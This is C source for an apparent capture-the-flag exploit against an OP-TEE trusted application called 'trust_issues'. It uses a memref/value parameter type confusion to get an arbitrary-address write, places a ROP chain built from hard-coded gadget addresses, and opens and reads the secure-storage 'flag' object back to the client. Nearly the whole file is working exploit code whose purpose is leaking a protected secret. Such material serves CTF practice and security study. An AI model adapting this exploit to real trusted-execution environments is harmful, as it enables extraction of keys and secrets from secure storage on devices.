#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* For the UUID (found in the TA's h-file(s)) */
#include <trust_issues_ta.h>

/* Addresses used */
#define ROP_ADDRESS         0x14c664                  // ROP start in the stack
#define FLAG_KEY_ADDRESS    (ROP_ADDRESS + 0x200)     // Address of flag object key string ("flag")
#define FLAG_ADDRESS        0x201000                  // Address for flag object writing
#define FLAG_HANDLE_ADDRESS (ROP_ADDRESS + 0x3C)      // Address of flag object handle
#define WRITEABLE_ADDRESS   (ROP_ADDRESS + 0x210)     // Address we can write to

/* Gadgets */
#define BASE            0x117000            // Base address of loaded TA
#define RETURN          (BASE + 0x000073A8) // return from TA to kernel
#define OBJ_OPEN        (BASE + 0x00007714) // open object
#define OBJ_READ        (BASE + 0x000077D0) // read object
#define POP_R0_R1_R2_R3 (BASE + 0x00001f84) // pop {r0, r1, r2, r3} ; pop {ip, pc}
#define POP3            (BASE + 0x000073b8) // pop {r5, r6, r7, pc}

uint32_t rop[0x100];
size_t   ropsz;

#define DW(x) rop[ropsz++] = (x) // add Double Word to the ROP-chain

void regs(uint32_t r0, uint32_t r1, uint32_t r2, uint32_t r3)
{
  DW(POP_R0_R1_R2_R3);
  DW(r0);
  DW(r1);
  DW(r2);
  DW(r3);
  DW(0);
}

void call(uint32_t address)
{
  DW(address);
  DW(0);
  DW(0);
  DW(0);
}

void genrop(void)
{
  // Open flag storage object by it's key
  // Resulting object handle is written right in it's place in the ROP
  regs(1, FLAG_KEY_ADDRESS, 4, 1);                          // 00
  call(OBJ_OPEN);                                           // 18
  DW(POP3);                                                 // 28
  DW(FLAG_HANDLE_ADDRESS);                                  // 2C
  DW(0);                                                    // 30
  DW(0);                                                    // 34

  // Read flag from storage by object handle
  // Object handle is written in place of 0x41414141 in previous open call
  regs(0x41414141, FLAG_ADDRESS, 0x100, WRITEABLE_ADDRESS); // 38
  call(OBJ_READ);                                           // 50

  // Return from TA copying input buffer (it's INOUT) with flag back to client
  DW(RETURN);                                               // 60

  // Use avaliable space to store flag object key
  char flagkey[] = "flag";
  memcpy((uint8_t*)rop + FLAG_KEY_ADDRESS - ROP_ADDRESS, 
    flagkey, sizeof(flagkey));
}

TEEC_Context ctx;
TEEC_Session sess;

void init(void)
{
  TEEC_Result res;
  TEEC_UUID uuid = TA_TRUST_ISSUES_UUID;
  unsigned int err_origin;
  
  res = TEEC_InitializeContext(NULL, &ctx);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

  res = TEEC_OpenSession(&ctx, &sess, &uuid,
    TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
      res, err_origin);
}

void fakeflag(char* flag)
{
  TEEC_Result res;
  unsigned int err_origin;

  TEEC_Operation op = {};
  op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,
           TEEC_MEMREF_TEMP_INPUT,TEEC_NONE, TEEC_NONE);
  op.params[0].tmpref.buffer = "flag";
  op.params[0].tmpref.size = 4;
  op.params[1].tmpref.buffer = flag;
  op.params[1].tmpref.size = strlen(flag);
  res = TEEC_InvokeCommand(&sess, 1,
    &op, &err_origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
      res, err_origin);
}

// This buffer is used to pass ROP chain to TA and retrieve flag after TA return
uint8_t input[0x8000];
char code[0x8000];

void aaw(uint32_t address, const uint8_t* data, size_t sz)
{
  // Prepare brain-fuck-like code to write input to output
  for(size_t i =0; i < sz; ++i)
    strcat(code,",<.<");
  
  // Put data we need to write in input buffer
  memcpy(input, data, sz);

  // Here is vulnerability
  // We pass output as value (uint32_t number), but TA think it's correct buffer address
  // So we have AAW primitive
  TEEC_Operation op = {};
  op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,
    TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INPUT, TEEC_NONE);
  op.params[0].tmpref.buffer = code;
  op.params[0].tmpref.size   = strlen(code)-1;
  op.params[1].tmpref.buffer = input;
  op.params[1].tmpref.size   = sizeof(input);
  op.params[2].value.a = address;
  op.params[2].value.b = sizeof(input);

  // Do AAW
  TEEC_Result res;
  unsigned int err_origin;
  res = TEEC_InvokeCommand(&sess, 0,
    &op, &err_origin);
}

void flag(const char* start)
{
  size_t start_len = strlen(start);
  for (size_t i = 0; i < sizeof(input) - start_len; ++i)
  {
    if (!memcmp(input + i, start, start_len))
    {
      printf("%s\n", input + i);
    }
  }
}

void exploit(void)
{
  init();
  genrop();
  aaw(ROP_ADDRESS, (uint8_t*) rop, sizeof(rop));
  flag("SAS");
}

int main(int argc, char *argv[])
{
  exploit();
}
